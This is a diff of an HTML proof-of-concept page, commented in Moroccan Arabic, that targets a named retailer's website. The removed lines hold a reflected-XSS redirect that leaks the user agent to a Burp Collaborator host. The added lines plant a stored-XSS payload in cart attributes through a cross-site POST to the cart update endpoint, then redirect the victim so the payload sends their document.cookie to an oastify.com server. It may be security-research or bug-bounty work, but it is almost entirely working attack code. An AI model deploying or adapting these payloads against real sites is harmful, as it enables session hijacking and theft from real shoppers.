@@ -1,22 +1,25 @@
 <!DOCTYPE html>
 <html>
-<body onload="launchPoC()">
+<head>
+    <title>PoC - Stored XSS via Cart Attributes</title>
+</head>
+<body>
+    <h1>Processing Decathlon Cart...</h1>
     <script>
-        function launchPoC() {
-            // الرابط ديالك فـ Burp Collaborator
-            var collab = "ji5t6qi3ejqblsp8s25bm3uuul0co7cw.oastify.com";
-
-            // هادا هو الكود اللي بغيتي ينفذ الـ IP Audit
-            // استعملنا navigator.userAgent حيت هو اللي كيبين الـ IP فـ السيرفر ديال Burp
-            var myScript = "fetch('https://" + collab + "/?audit_ip='.concat(btoa(navigator.userAgent)))";
-
-            // الرابط اللي ديجا جربناه وخدم (Reflected XSS)
-            // استعملنا </h1 ><script > باش نحقنو الكود مباشرة فـ الصفحة
-            var targetUrl = "https://www.decathlon.com/search?q=%3C/h1%3E%3Cscript%3E" + myScript + "%3C/script%3E";
-
-            // التوجيه التلقائي
-            window.location.href = targetUrl;
-        }
+        // هاد الكود غايصيفط الـ Payload لـ السيرفر ديال Decathlon ويخزنو فـ الـ Cart
+        const payload = "<script>fetch('https://r3v1ry3bzrbj60agdaqj7bf2ftlk9gx5.oastify.com/?exfil=' + btoa(document.cookie))<\/script>";
+        
+        fetch("https://www.decathlon.com/cart/update.js", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            body: "attributes[_source]=Rebuy" + encodeURIComponent(payload) + "&attributes[_attribution]=Smart Cart 2.0"
+        })
+        .then(() => {
+            // مورا ما يتخزن الـ Payload، غانصيفطو الضحية لـ صفحة الـ Cart باش يتنفذ الكود
+            window.location.href = "https://www.decathlon.com/cart";
+        });
     </script>
 </body>
 </html>
